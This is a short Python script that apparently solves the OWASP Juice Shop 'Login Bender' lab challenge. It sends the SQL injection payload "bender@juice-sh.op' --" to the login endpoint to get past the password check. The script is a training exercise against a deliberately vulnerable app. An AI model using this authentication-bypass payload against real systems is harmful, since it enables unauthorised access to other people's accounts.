import os
import requests

def main():
    juice_shop_ip = os.environ.get('OWASP_JUICE_SHOP_IP_ADDRESS', 'localhost')
    juice_shop_port = os.environ.get('OWASP_JUICE_SHOP_PORT', '3000')
    
    base_url = f"http://{juice_shop_ip}:{juice_shop_port}"
    
    login_url = f"{base_url}/rest/user/login"
    
    payload_email = "bender@juice-sh.op' --"
    payload_password = "password"
    
    login_data = {
        "email": payload_email,
        "password": payload_password
    }
    
    print(f"[+] SQL Injection payload: email='{payload_email}', password='{payload_password}'")
    print(f"[+] Sending POST request to {login_url}")
    
    response = requests.post(login_url, json=login_data)
    
    print(f"[!] Response status code: {response.status_code}")
    
    if response.status_code == 200:
        print("[✅] Login Bender challenge solved!")
        print(f"[+] Response: {response.text}")
    else:
        print("[❌] Challenge not solved!")

if __name__ == "__main__":
    main()
